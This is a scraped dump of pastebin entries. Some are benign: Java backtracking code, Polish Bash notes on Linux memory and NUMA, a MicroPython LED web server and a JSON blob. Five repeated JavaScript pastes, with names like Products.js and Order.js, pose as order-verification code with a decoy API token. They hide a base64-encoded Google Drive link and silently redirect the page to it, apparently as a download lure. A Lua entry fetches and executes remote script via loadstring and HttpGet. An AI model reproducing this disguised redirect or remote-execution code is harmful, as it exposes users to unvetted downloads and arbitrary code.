id,title,username,language,date,content
AUZ8G3mY,Untitled,KInddoo,JavaScript,Thursday 29th of May 2025 07:08:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07565/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pyPzp1qm,Products.js,KInddoo,JavaScript,Thursday 29th of May 2025 06:35:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26958/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eVUNXb0T,Order.js,KInddoo,JavaScript,Thursday 29th of May 2025 06:30:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97229/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yvRugTyX,Market.js,KInddoo,JavaScript,Thursday 29th of May 2025 06:24:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27648/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WvzZeWQc,Untitled,thewitchking,Java,Thursday 29th of May 2025 06:23:12 AM CDT,"import java.util.*;
class Main {
    
    public List<List<Character>> subsets(String s) {
        List<List<Character>> list = new ArrayList<>();
        char [] c = s.toCharArray();
        backtrack(list, new ArrayList<>(), c, 0);
        return list;
    }

    private void backtrack(List<List<Character>> list , List<Character> tempList, char [] cs, int start){
        if(!tempList.isEmpty())
            list.add(new ArrayList<>(tempList));
        for(int i = start; i < cs.length; i++){
            tempList.add(cs[i]);
            backtrack(list, tempList, cs, i + 1);
            tempList.remove(tempList.size() - 1);
        }
    }
    public static void main(String[] args) {
        System.out.println(new Main().subsets(""xyz""));
    }
}"
vLZqFXKT,Untitled,KInddoo,JavaScript,Thursday 29th of May 2025 06:19:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69584/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dXm3qqkm,uzupelnienie - do usuniecia,dadix102,Bash,Thursday 29th of May 2025 06:02:34 AM CDT,"echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.12]-----------------------------------------------------------------------------\033[0m
\033[0;32mVSZ\033[0m - rozmiar stron [KiB]
rozmiar wszystkich przydzielonych dla procesu stron (w KiB) (cała pamięć, do której proces ma dostęp, czyli
pamięć wymieciona + pamięć zaalokowana + pamięć bibliotek współdzielonych + pamięć plików wykonywalnych)
 
\033[0;32mRSZ\033[0m - rozmiar ramek [KB]
rozmiar wszystkich przydzielonych dla procesu ramek z jego stronami (w KB) (nie uwzględnia SWAP, ale
uwzględnia pamięć bibliotek współdzielonych, czyli pokazuje tylko stan aktualny ramek w pamięci fizycznej)
 
\033[0;32mStrona jest ladowana do ramki\033[0m (czyli fizycznej strony pamieci) w momencie, gdy proces potrzebuje dostepu do danego obszaru pamieci wirtualnej,
ktory nie jest obecnie obecny w pamieci fizycznej.\n
 
\033[0;32mnie kazda\033[0m strona jest przechowywana w ramce tego procesu\n
gdy proces odwoluje sie do strony pamieci ktorej nie ma w zadnej z jego ramek \033[0;32mwystapi blad strony\033[0m
\033[0;32mkolejnosc odszukiwania strony\033[0m - poza zbiorem roboczym, (gdy wystapi \033[0;32mblad strony\033[0m):
\033[0;32m1.\033[0m swap cache - jesli znajdzie to blad poboczny, aktualizacja zbioru roboczego, pozniej tablicy
stron
\033[0;32m2.\033[0m przestrzeni wymiany swap
\033[0;32m3.\033[0m plik regularny tego programu lub biblioteki
 
\033[0;32mStrona jest ladowana do ramki\033[0m w momencie, gdy program probuje uzyskac dostep do tej strony.

To co proces ma w segmentach to jego pamięć wirtualna, każdy segment jest podzielony na strony. Te ze stron, które są
załadowane do ramek to jego rzeczywista fizyczna pamięć ulotna. Strony, które nie są w ramkach, znajdują się w
plikach regularnych programu lub bibliotekach, wykorzystywanych przez proces. Strona. która jest niepotrzebna dla
procesu zmienia oznaczenie na nieaktywną i jej właścicielem zostaje swap cache.

\033m Bedy glowne maj_flt blad glowny strona nie należy do zadnej ramki
\033
\033m Blad poboczny min_flt poboczny należy do ramki ale nie należy do obszaru roboczego procesu 
co to obszar roboczy -  zbior ramek\033
""

echo bfq > /sys/block/sda/queue/scheduler
time perf sched record ionice -c 1 -n 0 stress -i 1 -t 240


ps -o pid,cmd,maj_flt,min_flt $(pidof stress)
ps -o pid,vsz,rsz $(pidof stress -s) | grep --color -E ""VSZ|RSZ|$""


 echo -e ""
\033[0;32m-------------------------------------------------------[4.1.1.24]-----------------------------------------------------------------------------\033[0m
    Należy regularnie kontrolować stan dostępnej pamięci operacyjnej (mem \033[0;32mused\033[0m i \033[0;32mavailable\033[0m) oraz ile mamy wykorzystanej
    pamięci swap (ilosc wolnych ramek w pamieci, zajetosc przestrzeni wymiany swap)
 
    Jeśli posiadamy mało wolnej ulotnej pamięci fizycznej (available) oraz mało wolnej pamięci przestrzeni wymiany (free),
    możemy spodziewać się podjęcia przez system operacyjny odpowiednich kroków
    
    \033[0;32mW przypadku presji pamieci\033[0m (kiedy brakuje ramek) system stosuje:
    \033[0;32m1.\033[0m wymiatanie stron.
    \033[0;32m2.\033[0m redukcja zbioru roboczego procesu - odebranie czesci przydzielonych procesom ramek
    \033[0;32m3.\033[0m procedura OOM (Out of Memory) - wybierane sa procesy, ktore zostana natychmiast zakonczone
    
    Aby procedura OOM nie była zastosowana możemy:
    \033[0;32m- powiekszyc przestrzen wymiany\033[0m poprzez dodanie pliku wymiany (ale tylko w Linuxie, w Windowsie nie można, bo trzeba by było restartować system
    \033[0;32m- zakonczyc procesy\033[0m, które są nam już niepotrzebne, dzięki czemu będziemy mieli kontrolę nad procesami, które zostaną zamknięte
    \033[0;32m- zapisać stan procesów\033[0m na dysku.
    
    Dlatego też instalowanie systemu bez przestrzeni wymiany swap jest złym pomysłem, ponieważ bez magazynów stron
    przyspierzymy wystąpienie procedury OOM.
 
    \033[0;32mfree\033[0m - rozmiar wolnej pamieci ulotnej(operacyjnej) ale bez ramek z przestrzeni swap cache (NIE UZYWANA PRZEZ ZADEN URUCHOMIONY PROCES,
        GOTOWA DO ALOKACJI DLA NOWEGO PROCESU)
 
    \033[0;32mAvailable\033[0m - rozmiar wolnych ramek wraz z ramkami z swap-cache, ktore zawieraja niezabrudzone i nieanonimowe strony
    
    pokaze wartosc free(mem)(rozmiar wolnych ramek) + ramki ze swap cache NIEZABRUDZONE I NIEANONIMOWE strony + z buforow te zabrudzone
 
    SZACUJE ILOSC PAMIECI MOZLIWA DO PRZYDZIELENIA NOWEMU PROCESOWI, BIERZE POD UWAGE BUFORY I CACHE, KTORE MOGA ZOSTAC ZWOLNIONE PRZEZ INNE PROCESY W RAZIE POTRZEBY
""
 
    free -wh | grep --color -E ""free|used|$""






1:
echo -e ""\033[0;32m-------------------------------------------------------[4.1.2.21]-----------------------------------------------------------------------------\033[0m""


2:
lscpu
numactl --cpunodebind=2 --membind=2 leafpad


1:
pidof leafpad
ps -o pid,nlwp -p $(pidof leafpad)
numastat -p $(pidof leafpad)
numactl -H
taskset -c -a -p $(pidof leafpad)

#uma - zasoby nie dziela się na wezly
#numa - zasoby dziela się na wezly zawierające pewny obszar pamięci operacyjnej i jednostki przetwarzające. Jest to korzystniejsze ponieważ przetwarzanie w ramach jednego wezla jest szybsze


echo -e ""Maska przypisana zgadza się z przypisanymi CPU do tego węzła (6-9) – widać, że nastąpiło ograniczenia zasobów
 
\033[0;32mNUMA\033[0m to architektura komputerów charakteryzująca się podziałem na węzły, które dysponują jednostkami przetwarzającymi i
ciągła przestrzenią pamięci ulotnej RAM
 
*Obowiązująca polityka NUMA oraz reguły koligacji są zawsze nadrzędne do ustalonej polityki szeregowania*
\033[0;32mNUMA > koligacja > priorytet statyczny > polityka szeregowania > priorytet zewnętrzny nice\033[0m
 
\033[0;32m#P\033[0m Co jeżeli reguły koligacji mówią że proces może korzystać z drugiego CPU a należy do węzła NUMA który nie zawiera tej
jednostki przetwarzającej?
- nie dostanie wtedy przydziału jednostki przetwarzającej ponieważ NUMA jest nadrzędna
NUMASTAT
- Huge - zakres dużych stron (mogą zajmować 2MiB)
- Heap - sterta
- Stack - stos
- Private - strony anonimowe (segment składa się ze stron)
Tablica TLB - przechowywane są ostatnio transformowane adresy stron z logicznych na fizyczne gdy odwołamy się do adresu
strony której nie ma zostanie ona przetransformowane.
Tablica stron - Zawiera numery ramek odpowiadające numerom stron
 
\033[0;32m#P\033[0m Skąd wiadomo, że ten proces korzystał z pamięci ulotnej, zlokalizowanej w tym ostatnim węźle?
- anonimowe segmenty pamięci - stos i stertę lokalizował w pamięci węzła nr 2. (pokazać niezerowe wartości po wykonaniu
polecenia numastat -p <PID>
 
\033[0;32m#P\033[0m Skąd wiadomo że to jednostki z ostatniego węzła?
- z polecenia numactl -H widać node 2 cpus: 6 7 8 9
 
\033[0;32m#P\033[0m Jakie zasoby przynależą do węzłów NUMA?
- jednostki przetwarzające i obszar pamięci ulotnej
""





echo -e ""\033[0;32m-------------------------------------------------------[4.1.2.22]-----------------------------------------------------------------------------\033[0m""

lscpu | grep NUMA

numademo 100M memset #może być 350M jak będzie dzialalo

#pokazuje:
#memory on node 1 memset Avg 17118
#dla
#memory interleaved on 0 1 2 memset Avg 16651

#przekaz danych poprzez szyne interconnect powoduje opóźnienie w przetwarzaniu

"
DgCV8MJC,dataNone,TestGuy1,JSON,Thursday 29th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '0df19224c60896023fec62661e381ab4612a59638c4010a500e471484a02c75576b46fa955eada663b17185092c2d028635ef0da84d50a2f98ec8b621d43622b76b163c4b5f63ec76584512c5cd98966d3cfcf829cf7ca1026935a6ed7427eaa8bfe5715ab2dbfbebdc97352b862c95a75e23da7e85d4b669e69050e5b8b1d07',
  otherdata: [
    'e1244e51e554b3906c7bd85404094710',
    'cac2159116153fde6e9434aadcbc7758',
    'caaafafe62b5446faa821ea5510ef510',
    'b41569182382709813d62a3ceef28f77',
    '609d82b6868825ebfe1012c375bd588a',
    'e9a3eddd643268fb7bc626ab59c79729',
    '9b222d11cbfcf8fd9cc8361864b2d968',
    '9f9b08d34d2d779f17685e18e9023ab5'
  ]
}"
RuFqsCYR,grow a fish pond,new2479,Lua,Thursday 29th of May 2025 05:59:41 AM CDT,"--https://www.youtube.com/@WinPo1R              pls sub 
--discord :      https://discord.gg/mdnJJYbjCh
 
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/powin273/script/refs/heads/main/Grow_a_Fish_Pond.lua"", true))()"
4MDcr4Kc,wifu_menu.py,orborbson,Python,Thursday 29th of May 2025 05:57:26 AM CDT,"import wifu, machine, socket
from micropython import const

state = None
led_on = const(1)
led_off = const(0)
sleep_ds = const(10)

def web_page():
    global state, led
    
    if state == 'on':
        led.value(led_on)
    elif state == 'off':
        led.value(led_off)
    elif state == 'ds':
        wifu.wlan.off()
        machine.deepsleep(sleep_ds * 1000)
    
    html = f'''<!DOCTYPE html>
    <html lang=""pl"">

    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>Sterowanie</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                margin-top: 50px;
                background-color: #f4f4f4;
            }}

            h1 {{
                color: #333;
            }}

            p {{
                font-size: 1.2em;
                color: #555;
            }}

            .button {{
                display: inline-block;
                padding: 15px 30px;
                margin: 10px;
                font-size: 1.2em;
                font-weight: bold;
                color: #fff;
                text-decoration: none;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                transition: background-color 0.3s;
            }}

            .button.on {{
                background-color: #4CAF50;
            }}

            .button.on:hover {{
                background-color: #45a049;
            }}

            .button.off {{
                background-color: #f44336;
            }}

            .button.off:hover {{
                background-color: #d32f2f;
            }}

            .button.deepsleep {{
                background-color: #8c0dc2;
            }}

            .button.deepsleep:hover {{
                background-color: #6b0b93;
            }}
        </style>
    </head>

    <body>
        <h1>{wifu.hostname}</h1>
        <p>Stan: {state}</p>
        
        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""on"" class=""button on"">Włącz</button>
        </form>

        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""off"" class=""button off"">Wyłącz</button>
        </form>
        <br>
        <form action=""/"" method=""get"" style=""display: inline;"">
            <button type=""submit"" name=""relay"" value=""deepsleep"" class=""button deepsleep"">głęboki sen ({sleep_ds} sek)</button>
        </form>
    </body>

    </html>
    '''
    return html

led = machine.Pin(2, machine.Pin.OUT, value=led_off)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 80))
s.listen(5)

while True:
    gc.collect()
    conn, addr = s.accept()
    request = conn.recv(1024)
    request_str = request.decode()
    redirect = False
    
    if 'GET /?relay=on HTTP' in request_str:
        state = 'on'
        redirect = True
    elif 'GET /?relay=off HTTP' in request_str:
        state = 'off'
        redirect = True
    elif 'GET /?relay=deepsleep HTTP' in request_str:
        state = 'ds'
        redirect = True
    
    if redirect:
        conn.send('HTTP/1.1 302 Found\r\nLocation: /\r\nConnection: close\r\n\r\n')
    else:
        response = web_page()
        conn.send('HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n')
        conn.sendall(response)
    conn.close()"
